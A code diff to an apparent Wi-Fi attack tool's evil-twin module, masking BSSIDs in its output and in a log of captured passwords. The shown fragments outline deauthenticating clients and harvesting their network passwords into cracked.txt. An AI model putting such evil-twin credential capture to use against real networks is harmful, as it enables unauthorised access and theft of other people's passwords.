@@ -6,7 +6,7 @@ import subprocess
 from scapy.all import sniff, Dot11
 from wifi_nightmare.deauth import BaseAttacker
 from wifi_nightmare.config import C_GREEN, C_RED, C_YELLOW, C_CYAN, C_WHITE, C_RESET
-from wifi_nightmare.utils import run_command, verify_password
+from wifi_nightmare.utils import run_command, verify_password, mask_bssid
 from wifi_nightmare.logger import logger
 
 
@@ -193,7 +193,7 @@ class EvilTwinAttack(BaseAttacker):
         self.esp.start_attack(self.bssid, self.channel)
 
         print(f"\n{C_GREEN}[+] Attack is running!{C_RESET}")
-        print(f"{C_YELLOW}[*] Clients deauthed from {self.bssid}{C_RESET}")
+        print(f"{C_YELLOW}[*] Clients deauthed from {mask_bssid(self.bssid)}{C_RESET}")
         print(f"{C_YELLOW}[*] They will connect to: '{self.ssid}'{C_RESET}")
         print(f"{C_YELLOW}[*] Waiting for password... (Ctrl+C to stop){C_RESET}\n")
 
@@ -220,7 +220,7 @@ class EvilTwinAttack(BaseAttacker):
                         print(f"{C_GREEN}[!!!] PASSWORD CRACKED SUCCESSFULLY [!!!]{C_RESET}")
                         print(f"{C_GREEN}{'=' * 70}{C_RESET}")
                         print(f"    Target: {self.ssid}")
-                        print(f"    BSSID: {self.bssid}")
+                        print(f"    BSSID: {mask_bssid(self.bssid)}")
                         print(f"    Password: {raw_pass}")
                         print(f"{C_GREEN}{'=' * 70}{C_RESET}")
 
@@ -229,7 +229,7 @@ class EvilTwinAttack(BaseAttacker):
 
                         with open("cracked.txt", "a") as f:
                             ts = time.strftime("%Y-%m-%d %H:%M:%S")
-                            f.write(f"[{ts}] SSID: {self.ssid} | BSSID: {self.bssid} | Password: {raw_pass}\n")
+                            f.write(f"[{ts}] SSID: {self.ssid} | MAC: {mask_bssid(self.bssid)} | Password: {raw_pass}\n")
 
                         self._stop_deauth_attacks()
                         self.esp.stop_all()
